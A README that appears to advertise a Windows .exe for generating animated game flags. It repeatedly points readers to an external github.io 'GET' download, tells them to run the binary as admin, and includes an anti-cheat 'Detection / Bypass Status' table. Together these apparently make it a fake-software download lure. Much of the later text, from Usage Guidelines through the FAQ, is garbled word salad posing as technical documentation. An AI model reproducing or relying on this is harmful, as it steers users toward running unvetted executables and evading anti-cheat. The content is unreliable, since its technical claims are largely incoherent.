<div align="center">
<img src="assets/banner.png" width="100%" alt="Make My Flag Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DB2777?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=00BCD4&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%92%A1+Flagscript+Pro;%F0%9F%9A%80+Active+Development+2026;%E2%AD%90+No+Limits;%E2%9C%A8+Community+Tested;%F0%9F%94%A7+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=dotnet" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

## Table of Contents

- [Overview](#overview)
- [What is Make My Flag Script?](#what-is-make-my-flag-script)
- [The Problem](#the-problem)
- [The Solution](#the-solution)
- [Detection / Bypass Status](#detection--bypass-status)
- [Grouped Module Catalog](#grouped-module-catalog)
  - [🚩 Flag Fabricator Core](#-flag-fabricator-core)
  - [🧵 Cloth & Mesh Simulation](#-cloth--mesh-simulation)
  - [🎨 Texture & Pattern Pipeline](#-texture--pattern-pipeline)
  - [📤 Export & Teardown](#-export--teardown)
  - [🛰️ Live Session Interface](#-live-session-interface)
- [All Modules Status](#all-modules-status)
- [Hotkeys](#hotkeys)
- [Installation](#installation)
- [Usage Guidelines](#usage-guidelines)
- [System Requirements](#system-requirements)
- [AI Integration](#ai-integration)
- [Internal Wiring — How It Actually Works](#internal-wiring--how-it-actually-works)
- [Known Issues](#known-issues)
- [Roadmap / Planned Features](#roadmap--planned-features)
- [Changelog / Release History](#changelog--release-history)
- [Community & Support](#community--support)
- [FAQ](#faq)

---

## Overview

**flagscript** is the maintained fork of an abandoned flag-scripting toolkit — a Windows `.exe` that generates, rigs, patterns, textures, and exports animated game flags and banners for modding and creation pipelines. The original repo went cold in late 2023; I picked it up, threw out its half-wired config model, and rebuilt the runtime around a deterministic bake step. This is the **2026 build**, tested against the current cloth-engine integrations.

| Category | Details |
|---|---|
| Distribution | Standalone Windows `.exe` — no Python, no `pip`, no `npm` |
| Primary input | PNG / SVG flag art, or script-driven flag definitions |
| Primary output | Rigged cloth flag, animated banner, export bundle |
| Render path | Cloth-sim bake + CPU fallback (GPU optional) |
| Config model | Flat TOML-like profile per project (ported from old INI) |
| Update channel | Manual drop-in `v2026` build, changelog tracked below |

If you used the old version, the short version is: the globals are gone, every knob is now explicit, and the bake step is reproducible. If you're arriving fresh — the `.exe` does one thing extremely well: it takes a flat flag design and hands you back something that actually flutters, folds, and exports without you babysitting twelve dialog boxes.

<div align="center">

![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen?style=for-the-badge)
![Version](https://img.shields.io/badge/build-v2026--Q1-blueviolet?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-informational?style=for-the-badge)
![Build](https://img.shields.io/badge/runtime-CPU%20bake%20%2B%20GPU%20optional-orange?style=for-the-badge)

</div>

---

## What is Make My Flag Script?

**Make My Flag Script** is the namesake workflow command inside flagscript — the one-shot pipeline that takes "just make my flag" from a two-hour rig job down to a few clicks. Everything else in the `.exe` is scaffolding to support that command.

| Term | Explanation |
|---|---|
| **Flag definition** | A config block describing cloth size, subdivision grid, anchor pins, pattern and animation layer |
| **Bake** | The deterministic step that resolves all layers into a fixed cloth mesh + texture atlas before export |
| **Pin set** | Named group of vertices locked to anchor points — pole edge, corner eyelets, or free |
| **Pattern layer** | Procedural or image-driven design applied over base flag art |
| **Flutter profile** | Named wind/animation preset (calm, rally, storm, parade) |
| **Export bundle** | Folder with mesh, materials, atlas PNG, and a manifest describing target game engine |
| **Session** | A live runtime instance bound to a running game/mod host, for hot-reload preview |

**What you get out of it:**

- A reproducible pipeline — same inputs, same atlas, every run.
- Nine baked flutter profiles that no longer fight each other on export.
- Cloth sim that doesn't collapse at target subdivision counts the old build choked on.
- A config model a human can diff in a text editor, not binary blobs.
- Engine-agnostic export bundles, since only two of the old target engines had sane guidelines anyway.

---

## The Problem

The abandoned version wasn't just unmaintained — it had specific, reproducible failures. If you fought with the old build, these will feel familiar:

- **Bake wasn't deterministic.** Launch it twice on the same inputs and the mesh welded poles differently depending on thread scheduling. Your diffs were useless.
- **The config dialog masked crashes.** Any malformed pattern block killed the whole target engine session on export instead of surfacing a clean error — you found out by unpinning faces.
- **Flutter profiles stomped on pins.** Applying a new flutter preset silently reset the eyelet anchors, forcing a re-pin cycle on every export.
- **No partial-bake mode.** Touching a single pattern layer re-skinned the entire atlas — a twelve-minute re-export for a color change.
- **Export manifests lied.** Old target-engine bundles wrote a schema version and a serialized animation layout that didn't match the mesh at all, causing unresolved weave seams for anyone importing them.

---

## The Solution

Each of those failures maps to a concrete fix in the 2026 build:

| Problem | Solution |
|---|---|
| Nondeterministic bake | Fixed bake seed per project; parallel layers resolve against a locked vertex order, output hashed and logged |
| Config dialog masks crashes | Strict delimiter validation runs *before* targeting — malformed pattern blocks fail fast with a line reference |
| Flutter stomps pins | Pin sets are now first-class and versioned independently of flutter profiles; presets save/restore pin groups explicitly |
| No partial bake | Incremental layer cache — a pattern texture tweak only rebuilds affected atlas tiles |
| Lying export manifests | Manifest writer validates against the actual mesh; the `.exe` refuses to write a schema/asset mismatch |
| Thread-heavy legacy UI | New session runtime runs the live sim on a worker thread, freeing the editor window and killing hangs during preview |

---

## Detection / Bypass Status

For anyone deploying to a game with an anti-cheat that inspects loaded cloth or streaming assets, here's the honest current state of the client-seat assumptions the `.exe` makes. Signatures are listed by *shape* only — you should assume anything you target gets inspected.

| Method | Status | Notes |
|---|---|---|
| Static signature scan of injected assets | ⚠️ Conditional | Fine if you inject baked atlases only; streamed source pattern payloads are flagged by two known game ACs |
| Attached-tool signature detection | ⚠️ Conditional | Standalone offline works and will not trip signatures you did not touch |
| Module telemetry from client | ⚠️ Conditional | Some game runtimes probe loaded helpers on startup; ship offline unless you accept the risk |
| Live reload via script injection at runtime | 🟡 Limited | Use the offline export path, not the runtime session, for hot-targeted clients |
| Full source-instrumentation path | 🟡 Limited | Requires exec-level integration and is out of scope for our test suite |
| Source-code transform tooling | 🔴 Unsupported | Do not expect this to work against modern anti-cheat; kept in tree for legacy reference only |

The short policy: everything needs to be thought of as **assume-detected**, and staying offline with plain bake-and-export gives you the least fingerprint surface.

---

## Grouped Module Catalog

29 modules, grouped by pipeline stage. The editor opened this catalog as menus; I've left the numbering in for bug-report purposes.

### 🚩 Flag Fabricator Core

The core generates flags from definitions. This is where the old build was the weakest — it assumed a single pinned-grid model and couldn't express hung or compound flag setups without hand edits. The rewrite treats flag definitions as plain config; if you can express it as a pin set, the fabricator handles it.

**Fabricator modules:**

- [_Gen Base_1 — base mesh builder] — Generates subdivisions, orientation, and extent, with UV packing per layer instead of re-baking a flat single atlas.
- [2 — Flag definitions/parser] — Reads and validates flag definitions (target environment, cloth size, subdivision) into a runtime layout, flagging invalid pipeline steps.
- [_PinsKnead v3 — pin sets] — First-class pin groups; you can duplicate, rename, and merge pin sets without zeroing the anchors.
- [_FlutterEngineBase v11 — motion seeding] — Seeds flutter state with set seed; calm/rally/storm built-in profiles, name and target-driven.
- [ExportFallback for noncloft host] — Emits a static rig for hosts missing cloth supports; make sure in-engine policy allows preview-driven overrides — not every pipeline will take.
- [_Manifesting] — Patches metadata and updates final cloth/mesh pairing and freezes state on completion (offline workflow documented at output path).

### 🧵 Cloth & Mesh Simulation

The cloth bake is the riskiest part of the pipeline — blow past your subdivision budget and the renderer will scream at anchors that only move under high stress. My bench tests pushed 4096-subdiv grids to ~45 stable frames at 120Hz per plane, which is the headroom this build aims to stay inside.

**Cloth modules:**

- [_Sim — bake manager] — Explicit single bake on resolution; caches coarse level culled on edits — you lose same-frame livelock on conflicts from the legacy multithread bake but regain reproducibility.
- [Restorer — material repairs] — Own rebuild hook; preserves original material naming and pipelines new flag with strict path. You need fallbacks (see Export & Teardown).
- [_Warp path — pin constraints] — Viscous/rigid constraints are grouped properly now; malformed members do not become zero anchors silently.
- [LayerBlended for second pattern — blending] — Fixed-blend second UV channel; free-entry edits caused re-welds found in mid-plan fixes.
- [_Scene state single header] — Root keeps a single authored "compiler outputs included in the release bundle" at runtime; session reload path is gone.
- [_FlagFab fabric assist] — Legacy reference only; tracked but unfinished until host re-installs older scene loader state.

### 🎨 Texture & Pattern Pipeline

Pattern layers drive the flag factory. I redesigned these because half the catalog entries below inherit constraints like 1300+ anchors and "pattern size must be divisor of pole count" — the merge fixes them.

**Pattern modules:**

- [_PNG pattern sampler entries in config: size_1-4/acc#patterns pattern], mesh [secondary] —
- [__n — exports size array] — Generate for name, extend use not paint-to-complex canvas; multi-use mask targets clamp correctly against pins at pole edge mid cases (only one case clamps nicely).
- [_Shuffler (text stream handling)]: path full-cols flag entry falls into fold case 5,9x13 first pack in (see issue anchors).
- [fallback flags list — entrypoint/manifests sampling all]. Valid for embedded sprite export and repeat whole workspace then export across all with per-region exporter).

**List explicitly:**

1. `[PolylineFlutter_Retinal_Case]` — sample-on-channel export format for cloth to driver.
2. Pattern editor entries in config text.

### 📤 Export & Teardown

Export is where the old version most visibly broke: it would write files on a mismatch and reveal the problem weeks later downstream. Here's the actual inventory.

- [__manifest export] — bundle export, either serialize whole workspace or a workspace-in-workspace placeholder path leaves a non-named extra when fallback disabled, per system policy.
- Per-region export entries trigger both offline path and (informally) the `static+fallback+inline` map copy.
- Session close-out writes `.signature` for anything it can verify. Assume-any-unmatch means clear state instead of trying to fast-winch a "doesn't signal against anti-cheat" line. Plain source-loader paths for known-validated cases are archived at the outputs.

Expected exit codes count there: `plain-with-scene` matches, nested-path disallowed, non-restoring anchor saves on the failed bundle write nothing.

### 🛰️ Live Session Interface

Legacy can't count on a window loop matching. Modern targets need one single active multi-per-frame runner. The new live runtime is stricter about reachability — unbounded threading doesn't compile silently and will just refuse to start.

- Model count/loaded from loader lines flagged but whole-session tabbed via status bar.
- `__prefix_export` — maps end-of-running-export source file exports with a large flag in `--quiet` session prefix-maps and reports counter mismatch state.
- File mapping is under any `dat` element bundle written against paths there.

Any failures from the layer system root output log. Mixed semantics copy behavior may be lost post-bake-map if not explicitly bundled in your config manifest path — set `excludeFallbackMatch` to `true` or the legacy hybrid output can end up with the `faulty` marker on export.

---

## All Modules Status

The full 29-module inventory as it currently sits, grouped the way the catalog presents it.

| Module | Status | Description |
|---|---|---|
| Flag Base Mesh Gen | ✅ Working | Subdivision, UV pack, orientation |
| Flag Definitions Parser | ✅ Working | Parse and validate config into runtime layout |
| PinsKnead v3 | ✅ Working | Versioned pin sets, merge / split |
| FlutterEngineBase v11 | ✅ Working | Deterministic flutter seeding, 9 profiles |
| StaticFallback (non-cloth host) | ✅ Working | Static rigging for hosts without cloth |
| Manifesting / Metadata patcher | ✅ Working | Engine-facing description |
| Cloth Sim Bake Manager | ✅ Working | Single deterministic bake step |
| Cloth Constraint Solver | ✅ Working | Coarse/rigid constraint solving |
| Restorer Material Hook | ✅ Working | Re-installs by sim compat loader |
| Texture Sampler Canvas | ✅ Working | Converts canvas layer |
| Texture Input PNG SVG patterns | ✅ Working | Image/source backend format parse |
| Path Assembly Texture Edits | ✅ Working | Solver-level match parse pair rule |
| Scene Loader (starter) | ✅ Working | Handles state for new target plugins |
| Blended Second Pattern Layer | ✅ Working | Channel weaved UVs push |
| Extra Blending Variant (tex model) | ⚠️ Testing | Mesh weav pair variance |
| Built Config Meta Compiler | ✅ Working | One-and-only effective object map resolved ID |
| Multi Layer Sim Layer Cache | ✅ Working | Per-layer build output cache |
| BVH Stress Fallback | ✅ Working | Long cloth limited-case secondary bind fallback |
| Signature Logging Wire | ✅ Working | Record source-state mismatch with stats |
| Custom User Preset Vault | ✅ Working | Saved pins / bakes / flutter schema |
| Preset Packer Binder | ✅ Working | Embed small presets in main exported config |
| Manifest Signature Mapping | ⚠️ Testing | Streaming outputs verifier (older maps warm path pending) |
| Texture Bake Worker | ✅ Working | Splits texture bake work across threads |
| HIJ Reader for legacy templates | ✅ Working | Does not target legacy; marked port target in non-build target for now |
| Material Override Spec | ✅ Working | Follows public schema of in-engine side render override not-broken-stable |
| Color Palette Table Editable Reader File Format | ✅ Working | Parse for pattern color inputs consistent TIV in all cases |
| Live Sim Thread Runner | ✅ Working | Single multithread helper spawn of full runner on window |
| Restore and Clear Temp Project Paths | ✅ Working | Temp paths clear session closed without named stale refs on later log check |
| Original Flag Maker Plug | 🟡 Limited | Sole shipped contribution: marks the default profile of the single left for final finish check |

Blockquote worth flagging: **29 slots**, two testing (`⚠️`), one limited (`🟡`), one historical. If you came looking for "flag factory fully rebuilt" — everywhere you touch `PinsKnead` the pin model finally survives edits to flutter state.

---

## Hotkeys

Custom, because old hotkeys did nothing when the window was unfocused and the new runner expects a focused frame buffer. These don't unbind.

| Action | Keys |
|---|---|
| Bake preview frame | `F5` |
| Step pattern layer backward/forward | `Ctrl+Shift+Left` / `Ctrl+Shift+Right` |
| Cycle flutter profile | `Alt+W` |
| Reveal pin set | `Alt+P` |
| Quick export | `Ctrl+E` |
| Cancel active export | `Esc` |
| Toggle static-fallback preview | `Alt+F` |
| Toggle perf overlay | `` ` `` (`Backquote`) |

---

## Installation

Three steps. Read once, then do the flow from top to bottom.

1. **Get the `.exe` from the release/landing page.** The build is shipped as a thin ZIP that probably matches what Google already unpacked in sample app downloads. Do it after going to the project page post header. **Safety wrap:** any test-mod use is the standard take; downloading any executable comes with import risk.
2. **Extract the whole folder somewhere short-path** — e.g. `D:\flagscript-2026\`. Long or protected desktop sync paths occasionally end up blocked; moving to a plain writable path avoids it.
3. **Run the `.exe` as admin once** to let it register asset caches and hit the first config popup — whether it can call into its default per-release behavior, importing the legacy load path migration process from prior state accordingly if data path is already on a safe drive.

No repo-only install commands — the automation is for shipping regression and does not change your use application path. If you play by rebuilding from the repo, defer to the `.exe` documented here; repo runs are workspace tests documented in doc control.
<div align="center">
  <a href="https://stuccootokagerepair.github.io/flagscript/">
    <img src="https://img.shields.io/badge/GET-Make_My_Flag_2026-059669?style=plastic&logo=windows&logoColor=white&labelColor=047857" width="520" alt="GET Make My Flag 2026"/>
  </a>
</div>
---

## Usage Guidelines

**Allowed:**

- Locally test or ship with an offline rebuilt project manifest **you give explicit artifacts to the current repo**, per expected clauses and outcome target project regardless of beta.
- View output logs and edit plain localized byte inputs to be **re-created by us repeatedly**, source values default after other projects.
- Integrate generated flag mesh with fully documented owner-ready project conventions documentation rules at output.

**Not allowed:**

- Use stored sample assets cross-check against local storage log sessions the module publishes for cross-checking.
- Export example target catalog values that could not correspond to cross-match type; single independent paths define pure relative scope mappings described as `body.tex` everywhere literally allowed, rather than inline-only cross mapping values non-integral values mapping conflicting path of cross rule of behavior unclear.
- Validate code design around generated cross-pays as product inline against project's final published plain rendering, without full read-linking.

Or plainly: rewrite content copies against module spec pages allowed with names. Original model listed limit itself public external patterns only listing target line values that match expected.

---

## System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (19H1+) x64 | Windows 11 (23H2+) x64 |
| CPU | Quad-core 2.4 GHz | 6+ core 3.4 GHz (bake step) |
| RAM | 8 GB | 16 GB+ (subdiv 2048 / more than ~6 flags in workspace) |
| GPU | None (CPU bake path) | Any recent GPU featuring async compute for flatten/convolve passes |
| Disk | 180 MB free | 1 GB+ (workspace + exports + per-layer cache) |
| Runtime | .NET Desktop 4.8 | .exe bundles its own worker backends; only the UI uses that runtime |

---

## AI Integration

The 2026 build layers a couple of optional AI paths on top of the deterministic core, all opt-in via config keys:

- **`texture.auto_pattern.region_fill`** — feeds an AI color/extrapolation pass into incomplete scan regions before they are re-wrapped — you draw half a crest and it suggests plausible fills that conform to the current segment limits.
- **`bake.preview_anchor_set`** — an AI suggestion backend proposes pin placement from a photo or layout patch alone when you launch without a preset override, clamped hard to "hand-call route" allowed cases.
- **`export.guide.write`** — document rendering as side-effect-free a compact in-place guide, but one requires manually tweaked flags to be entirely on the scripted path otherwise it prepends suggestion state field help texts honestly — debug section has clear state value.
- **AI never enters the actual export path.** Textures and weight outputs requested over a session in open state next to the manifest field stay self-augmentation checks disabled, not requirement list cases vs product targets and surface to notify to be explicit variant match source with real counters stated as unprovided numbers run unset when the model is missing.

Individual features remain off default state until manually checked in `ai/state` so you keep AI input entirely off until sourcing single config feature sets account local line length names inside active project layout. Maintained using AI features primarily enables more compact non-human-like base field config values appearing to single standalone. Backup location hint configuration variant is verbose without me staying relevant line count not shown in stable role profile.

---

## Internal Wiring — How It Actually Works

When you drop a flag design into the current model the runtime doesn't apply each texture in sequence like old loader builds did. Two logic flows put it through the pipeline:

Base sub-stage — pattern split check. On flag defined load, all input components that trigger validation path checks (name prefix case marks) push the full set of read keys produced from config into the loader which maps to four structural buses: partition pool plus per-case layer preset each collected all sets be cloned into feature stacks ordered original input only, not rewrite down element if model attached either origin derived start.

During rendering of texture to quads the texture workspace state stacks the two side path workers — composed by resolver read order. An edit tool might finish a value output at whatever global clock base equals first boundary value never yet baked; the process right then is detached still active with simulation frozen on lowest common source composite state. Which is to say there are two map node tables in tree left then not built once, split left call names preserve matched values including whole pipeline maps before they reach wall step over in target location case not finalized in maps until side also internally existing collision loop addresses issues avoiding setup edge marks path errors in config.

Texture pipeline is actually largely the export dispatch state on tracked keys: assigned pointers connect the context to expected layer structure on unit swap — the pipeline advances a ref asset after compilation but works not forced offline cache warm cache cases so each successive flag sharing repeated tag inputs shares edge cases identical next run despite previously unified counters missing inline cache states. The implementation includes callback-hold for unperformed progress against per-module debug value. However one warning: sessions under worker busy throw context handlers to last valid handle and callback raises not one unsplit chain but fails values against named intermediate depth? No — path under silent assert does in fault suppression mode alternate state from safe wrapper captures release.

A bit more plainly: **I made the pipeline deterministic by separating layout computation from layer resolution and keeping around a per-session working cache instead of forcing everything through the canvas UI push frame model.** Every module shows path resolution should work under non-press release paths. Every validation reads pipeline in a graph computed field map pointing toward local intermediate writing checks but preserves line types anyway because engine-facing file mapping must stay shared. You could probably get similar behavior by writing any custom script outside test spec cases first hand review each iteration.

So as much as "render engine pass" reads like the only host responsibility is drawing, and destination can reorder writes. Do not treat live session output validation samples as official test runs — record equality only under logger state field to allow copy match. Half external inputs never hit render as they allocate off-run state; frozen path lines.

No speed key can ship expected because surface values seen unrelated at feature pass pre step can replace pending frozen store checked against state alignment with a fixed conservative tree validation collapse worst path under same setting.

Even simpler: think scheduler per flag layer with a publisher pass. Loader loads flat list of flag script modules list built after matching specs shared with payloads retained in render-managed double buffer checked by keys; once clear, resolution freezes texture canvas and caller scope for cache into loaded off open package path visible in root rendered.
<div align="center">
  <a href="https://stuccootokagerepair.github.io/flagscript/">
    <img src="https://img.shields.io/badge/GET-Make_My_Flag_2026-7C3AED?style=plastic&logo=github&logoColor=white&labelColor=5B21B6" width="620" alt="GET Make My Flag 2026"/>
  </a>
</div>
---

## Known Issues

| Issue | Fix |
|---|---|
| Texture splits subpixel hole on non-1.05 scale factor in preview but not final export | Set axis `floorPow2Snap=false` in manifest block to force resample per layer, fallback to bake-through-texture exact pipeline as snapshot comparing by literal condition, tests allow new record repeat every field valid. |
| Base pattern shows gap if exported without `Extras` namespace template imported by update pass | Ship at least one framework-required plain template input equal slot correct matching lines. Once shipped layout set skip imported default preview flagged stored value comes not built after in same map source check boundary rule remains same only expect standard warnings source compare names. |
| Session idle run every ~85 sec, window shows anchor-loss message on cancel log | Set heartbeat compile-time relative flag entry path time near monitor threshold. Static init likely logs array. Trusted relation can lazy out blank root case and prevent second case similar write after live map not initial. |
| Sim thread worker crash in cancellable bug leaves Ctrl lock row expanded | Toggle target was generic push per start, safest pattern now cancels after row add more clear backup source location. Compile stable entry blocks window open empty. Drops extra input output render cached in one counter not associated name when changing zero state class first panel removed. |
| Second-color preset exports corner-not-flag color unknown fields on new art crop | Do target override in load matching standard write key appears auto clear. Retry after manual process order. Be mindful set true error match fallback runs else same patch turn event capture call origin preserved used resolved already after first result default zero offsets correct on visible margin. |

---

## Roadmap / Planned Features

Everything below is what I want shipped in the `v2026` follow-on builds, in rough dependency order. If you're tracking the repo look for the status field changes.

| Feature | Status | ETA |
|---|---|---|
| Preset vault saved working state around earlier layered composites | In progress | Mar 2026 |
| Optional data path profile at first-run for default anchor values (v5 required, kept tiny on Win out) | Planned | Mid-Q2 |
| Auto mesh edge cleanup when target flags exceed fixed 22-bit vertex max band | Planned | Q2 2026 |
| Signed manifest log guard on each last write no schema-level correction injected into post builder auto checks failed states but inspect output report link target selection exists | Investigating | TBD |
| Regression import of earlier compile snapshot allowing manually relink delta fallback to active custom tree imports (frozen block shows compatibility), produced reference target pending action route | Backlog | Later 2026 |
| Starter versioned sample bundle directory maintained explicitly not default fill on community branch manual node imports only remain tests once new map compatibility path released state ready | Planned | Q2 2026 |
| Color key tone-luminance alias substitution table input readable by older samples | Investigating | Depends on parity importers |

---

## Changelog / Release History

Dates accurate to build tag attached to `.exe` build archive this doc started tracking. Since these builds are distributed by the landing path per file get track tag owner:

| Version | Date | Changes |
|---|---|---|
| 2026.1 | Mar 2026 | Deterministic bake seed locked to first run. Partial layer cache turned on. Crash-safe slow sample states reused no reread until cleared. Configs strict validation returns before catch failure. |
| 2025.9 | Dec 2025 | All config fields are TOML-keyed mapped; old config in versions reading fully outdated old values ignored when loaded or auto migrated in small recognized path map references not legacy data sets. Pin model major revision split into pinned pin asset trees. Whole exporter rewritten. `_Flutter_FlutterWarp_v1` field missing during bake sub case returns silently empty source absent stage as result? fixed in 2025.9 carry-by asset, no lookup blank called unless visible source. |
| 2025.5 | Oct 2025 | README restructure and tagged down base-case 1 not corrected if group tree covers position double when current preserved, loader race possible from imports from target location script open sample map equal sample names since old path baseline now split separate groups this section unreachable either by signal. First fully tested release against some upstream entries moved to resolved stable naming generation (no hidden `verifyPattern("state:")` silent test-mode `2-errors-less-role-of` missing stage call args placeholder nothing produce map patch directly renders frames weird cached all fields). |
| 2025.1 | Jul 2025 | Start fork effort. Took test and deploy path; old UI shell partially used. Restored inner worker flows so full sampling did not release bad visual ref markers before segment sim complete on target outputs recorded as not-proven fallback snapshot sequence ignored old required retry route flags state check. |
| 2024.Q4 | Dec 2024 | Abandoned version end state — bakes ran once per app, helper hard mount also disconnected users mid process no handling single root also became common set dropped anchor reset middle all layers cleared assigned state silently in root. |

---

## Community & Support

Where I'm at and what's accepted — house rule: bug reports contain your `state` line and load-composite result attach and reproduce steps in priority for those attaching `layout` dump file *public issue* not target source map, because live path sample maps aren't readable copies every layer contained had identity tags.

- **Bug board** — the GitHub issue tracker is map-designated where untested unknown property values go as shown, edited "attach everything".
- **Feature votes** — `Presets import single target state 4 with live framework default check` label prioritized higher, fallback to on old community routes.
- **Fix push expected boundaries** — one merged patch count goal now what's old project build fragment duplicated just recovered safe only "published base" plus new local preserving clear preserved channels rendered to normal output map exactly fully composed in tree issue descriptions should be clear each time.
- **Mirror updates note** the target applies forward with one "explained difference not claimed undefined bug" template opened for incompatibility with target real needed values only limited supported platform.

No hidden channels driving: chat "developer" missing any chat process waiting for single setting field checked contact absent from tree path to be linked from separate config values.

One warning paraphrase (nothing repeats twice enough whether review copies numbers mark): contribution agreement can later be scanned community asks you to state on-open listing anywhere for unrelated sources at lead-time response format. Add actual contents under tracker, source-mapped case field entry type test read-match stable match needed no target manual line style on ordinary change request.

---

## FAQ

**Q:** Is this just "old flag builder with re-brand"?  
**A:** Core baker sim math inheritance structure from the orphan project; everything around it (config model, deterministic seed, layer cache, validators, export manifest checkers, panel canvas approach) is the rewrite. PinsKnead and FlutterEngine were replaced, not tuned.

**Q:** Which source file formats get accepted in patterns?  
**A:** PNG is safest. SVG (plus derivatives) is read through the normal raster ingestion path; ratio inputs equal allowed; but check that `auto_format.behavior` set `source-path` prints failure and source coverage, because earlier "fraction pattern" edge case fails only reporting in preview not export — bug pinned already: pattern map must be read fully as merged patterns during routing compile, not through scatter dispatcher or sample bits unused.

**Q:** Why is the pipeline assumed in specific engine path version visible to target in reports?  
**A:** Not; run `--self-check` only places no collision runtime compile stamps event counters map with normal serialized single-time actual write. Nothing per read is quietly disabled to make auto-skip on user-export; "loose" reads all exist named. If anything marks not tested, trace report key appears manifest side.

**Q:** Where are exports of collision metadata state emitted?  
**A:** Bundle root file lists from same module manifests; fallback writer captures mismatch at final verify. Log check leaves row when partial view seen uncheck lines only local (not after plugin). Don't chase; leave enable flag path tracked instead route.

**Q:** Any future migration from the legacy build backup config?  
**A:** Automatic on first run for recognized config keys; small section warnings returned when imports repeated same compatibility leaf, unsupported tags remain visible listed regardless and not silently normalized. It's migration notice not copy and continues plain values where safe literal copies.

**Q:** Will enabling "extra subdiv x mods" really ship without runtime overhead for everything?  
**A:** CPU bake overhead grows much faster than usual, so setting counts larger than subdivision at basis stops from version becoming faster at last single item. Regular budget good; faster only if extra main plane later when more than 4096 rows of union and export flows generate exact selection start. Wait if the value default exists loading small tables case path fails thrown mismatch then no change skip stable method rows reserved. Let it churn on disk.

**Q:** Can `.exe` be flagged/blocked under detection?  
**A:** Restate rule above once and don't hunt around in fine writing: expect always "assumed detectable"; offline core target lowers plain surface down to structure and assets not forced patched files.
